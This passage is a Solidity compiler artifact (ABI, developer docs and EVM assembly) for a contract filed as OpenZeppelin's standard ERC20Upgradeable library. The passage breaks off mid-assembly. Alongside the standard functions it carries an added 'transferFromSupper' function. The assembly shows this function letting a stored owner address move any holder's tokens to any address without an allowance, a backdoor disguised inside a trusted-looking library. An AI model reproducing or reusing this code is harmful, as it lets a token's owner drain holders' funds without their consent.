{
	"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol": {
		"ERC20Upgradeable": {
			"abi": [
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "uint8",
							"name": "version",
							"type": "uint8"
						}
					],
					"name": "Initialized",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "account",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "conOwner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "conOwner2",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "subtractedValue",
							"type": "uint256"
						}
					],
					"name": "decreaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "addedValue",
							"type": "uint256"
						}
					],
					"name": "increaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferFromSupper",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"details": "Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. For a generic mechanism see {ERC20PresetMinterPauser}. TIP: For a detailed writeup see our guide https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. We have followed general OpenZeppelin Contracts guidelines: functions revert instead returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications. Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification. Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.",
				"events": {
					"Approval(address,address,uint256)": {
						"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
					},
					"Initialized(uint8)": {
						"details": "Triggered when the contract has been initialized or reinitialized."
					},
					"Transfer(address,address,uint256)": {
						"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
					}
				},
				"kind": "dev",
				"methods": {
					"allowance(address,address)": {
						"details": "See {IERC20-allowance}."
					},
					"approve(address,uint256)": {
						"details": "See {IERC20-approve}. NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address."
					},
					"balanceOf(address)": {
						"details": "See {IERC20-balanceOf}."
					},
					"conOwner()": {
						"details": "Returns the address of the current owner."
					},
					"decimals()": {
						"details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless this function is overridden; NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
					},
					"decreaseAllowance(address,uint256)": {
						"details": "Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
					},
					"increaseAllowance(address,uint256)": {
						"details": "Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address."
					},
					"name()": {
						"details": "Returns the name of the token."
					},
					"symbol()": {
						"details": "Returns the symbol of the token, usually a shorter version of the name."
					},
					"totalSupply()": {
						"details": "See {IERC20-totalSupply}."
					},
					"transfer(address,uint256)": {
						"details": "See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `amount`."
					},
					"transferFrom(address,address,uint256)": {
						"details": "See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `amount`. - the caller must have allowance for ``from``'s tokens of at least `amount`."
					}
				},
				"stateVariables": {
					"__gap": {
						"details": "This empty reserved space is put in place to allow future versions to add new variables without shifting down storage in the inheritance chain. See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps"
					}
				},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":1480:14254  contract ERC20Upgradeable is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":1480:14254  contract ERC20Upgradeable is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x39509351\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x3c186285\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x4f88f762\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_12\n      jumpi\n      dup1\n      0xa457c2d7\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_14\n      jumpi\n      dup1\n      0xc4a7f8ed\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_16\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2544:2642  function name() public view virtual override returns (string memory) {... */\n    tag_3:\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4821:5018  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_4:\n      tag_21\n      tag_22\n      calldatasize\n      0x04\n      tag_23\n      jump\t// in\n    tag_22:\n      tag_24\n      jump\t// in\n    tag_21:\n      mload(0x40)\n        /* \"#utility.yul\":1169:1183   */\n      swap1\n      iszero\n        /* \"#utility.yul\":1162:1184   */\n      iszero\n        /* \"#utility.yul\":1144:1185   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1132:1134   */\n      0x20\n        /* \"#utility.yul\":1117:1135   */\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4821:5018  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n      tag_19\n        /* \"#utility.yul\":1004:1191   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3632:3738  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_5:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3719:3731  _totalSupply */\n      sload(0x35)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3632:3738  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_27:\n      mload(0x40)\n        /* \"#utility.yul\":1342:1367   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":1330:1332   */\n      0x20\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3632:3738  function totalSupply() public view virtual override returns (uint256) {... */\n      tag_19\n        /* \"#utility.yul\":1196:1373   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5580:5866  function transferFrom(... */\n    tag_6:\n      tag_21\n      tag_32\n      calldatasize\n      0x04\n      tag_33\n      jump\t// in\n    tag_32:\n      tag_34\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3481:3572  function decimals() public view virtual override returns (uint8) {... */\n    tag_7:\n      mload(0x40)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3563:3565  18 */\n      0x12\n        /* \"#utility.yul\":1853:1889   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1841:1843   */\n      0x20\n        /* \"#utility.yul\":1826:1844   */\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3481:3572  function decimals() public view virtual override returns (uint8) {... */\n      tag_19\n        /* \"#utility.yul\":1711:1895   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6823:7057  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_8:\n      tag_21\n      tag_41\n      calldatasize\n      0x04\n      tag_23\n      jump\t// in\n    tag_41:\n      tag_42\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6240:6328  function conOwner() public view virtual returns (address) {... */\n    tag_9:\n      tag_44\n      tag_45\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":2064:2096   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":2046:2097   */\n      dup2\n      mstore\n        /* \"#utility.yul\":2034:2036   */\n      0x20\n        /* \"#utility.yul\":2019:2037   */\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6240:6328  function conOwner() public view virtual returns (address) {... */\n      tag_19\n        /* \"#utility.yul\":1900:2103   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5872:6165  function transferFromSupper(... */\n    tag_10:\n      tag_21\n      tag_49\n      calldatasize\n      0x04\n      tag_33\n      jump\t// in\n    tag_49:\n      tag_50\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3796:3921  function balanceOf(address account) public view virtual override returns (uint256) {... */\n    tag_11:\n      tag_27\n      tag_53\n      calldatasize\n      0x04\n      tag_54\n      jump\t// in\n    tag_53:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3896:3914  _balances[account] */\n      and\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3870:3877  uint256 */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3896:3914  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3896:3905  _balances */\n      0x33\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3896:3914  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":3796:3921  function balanceOf(address account) public view virtual override returns (uint256) {... */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2755:2857  function symbol() public view virtual override returns (string memory) {... */\n    tag_12:\n      tag_17\n      tag_58\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7544:7971  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_13:\n      tag_21\n      tag_61\n      calldatasize\n      0x04\n      tag_23\n      jump\t// in\n    tag_61:\n      tag_62\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4117:4306  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_14:\n      tag_21\n      tag_65\n      calldatasize\n      0x04\n      tag_23\n      jump\t// in\n    tag_65:\n      tag_66\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6333:6426  function conOwner2() public view virtual returns (address) {... */\n    tag_15:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      caller\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6333:6426  function conOwner2() public view virtual returns (address) {... */\n      jump(tag_44)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4364:4513  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_16:\n      tag_27\n      tag_72\n      calldatasize\n      0x04\n      tag_73\n      jump\t// in\n    tag_72:\n      tag_74\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2544:2642  function name() public view virtual override returns (string memory) {... */\n    tag_18:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2598:2611  string memory */\n      0x60\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2630:2635  _name */\n      0x36\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2623:2635  return _name */\n      dup1\n      sload\n      tag_77\n      swap1\n      tag_78\n      jump\t// in\n    tag_77:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_79\n      swap1\n      tag_78\n      jump\t// in\n    tag_79:\n      dup1\n      iszero\n      tag_80\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_81\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_80)\n    tag_81:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_82:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_82\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_80:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2544:2642  function name() public view virtual override returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4821:5018  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_24:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4904:4908  bool */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      caller\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4958:4990  _approve(owner, spender, amount) */\n      tag_86\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4974:4981  spender */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4983:4989  amount */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4958:4966  _approve */\n      tag_87\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4958:4990  _approve(owner, spender, amount) */\n      jump\t// in\n    tag_86:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5007:5011  true */\n      0x01\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5000:5011  return true */\n      swap2\n      pop\n      pop\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4821:5018  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_83:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5580:5866  function transferFrom(... */\n    tag_34:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5707:5711  bool */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      caller\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5763:5801  _spendAllowance(from, spender, amount) */\n      tag_91\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5779:5783  from */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      dup3\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5794:5800  amount */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5763:5778  _spendAllowance */\n      tag_92\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5763:5801  _spendAllowance(from, spender, amount) */\n      jump\t// in\n    tag_91:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5811:5838  _transfer(from, to, amount) */\n      tag_93\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5821:5825  from */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5827:5829  to */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5831:5837  amount */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5811:5820  _transfer */\n      tag_94\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5811:5838  _transfer(from, to, amount) */\n      jump\t// in\n    tag_93:\n      pop\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5855:5859  true */\n      0x01\n      swap5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5580:5866  function transferFrom(... */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6823:7057  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_42:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6911:6915  bool */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      caller\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6965:7029  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      tag_86\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6981:6988  spender */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7018:7028  addedValue */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6990:7015  allowance(owner, spender) */\n      tag_99\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      dup4\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6981:6988  spender */\n      dup4\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6990:6999  allowance */\n      tag_74\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6990:7015  allowance(owner, spender) */\n      jump\t// in\n    tag_99:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6990:7028  allowance(owner, spender) + addedValue */\n      tag_100\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_100:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6965:6973  _approve */\n      tag_87\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6965:7029  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6240:6328  function conOwner() public view virtual returns (address) {... */\n    tag_45:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6315:6321  _owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x38))\n      swap1\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6240:6328  function conOwner() public view virtual returns (address) {... */\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5872:6165  function transferFromSupper(... */\n    tag_50:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5998:6002  bool */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6032:6042  msg.sender */\n      caller\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6018:6028  conOwner() */\n      tag_104\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6018:6026  conOwner */\n      tag_45\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6018:6028  conOwner() */\n      jump\t// in\n    tag_104:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6018:6042  conOwner() == msg.sender */\n      and\n      eq\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6010:6081  require(conOwner() == msg.sender, \" Ownable3: caller is not the owner\") */\n      tag_105\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3378:3380   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6010:6081  require(conOwner() == msg.sender, \" Ownable3: caller is not the owner\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3360:3381   */\n      mstore\n        /* \"#utility.yul\":3417:3419   */\n      0x22\n        /* \"#utility.yul\":3397:3415   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3390:3420   */\n      mstore\n        /* \"#utility.yul\":3456:3490   */\n      0x204f776e61626c65333a2063616c6c6572206973206e6f7420746865206f776e\n        /* \"#utility.yul\":3436:3454   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3429:3491   */\n      mstore\n      shl(0xf1, 0x32b9)\n        /* \"#utility.yul\":3507:3525   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3500:3532   */\n      mstore\n        /* \"#utility.yul\":3549:3568   */\n      0x84\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6010:6081  require(conOwner() == msg.sender, \" Ownable3: caller is not the owner\") */\n    tag_106:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_105:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6110:6137  _transfer(from, to, amount) */\n      tag_108\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6120:6124  from */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6126:6128  to */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6130:6136  amount */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6110:6119  _transfer */\n      tag_94\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6110:6137  _transfer(from, to, amount) */\n      jump\t// in\n    tag_108:\n      pop\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6154:6158  true */\n      0x01\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":5872:6165  function transferFromSupper(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2755:2857  function symbol() public view virtual override returns (string memory) {... */\n    tag_58:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2811:2824  string memory */\n      0x60\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2843:2850  _symbol */\n      0x37\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":2836:2850  return _symbol */\n      dup1\n      sload\n      tag_77\n      swap1\n      tag_78\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7544:7971  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    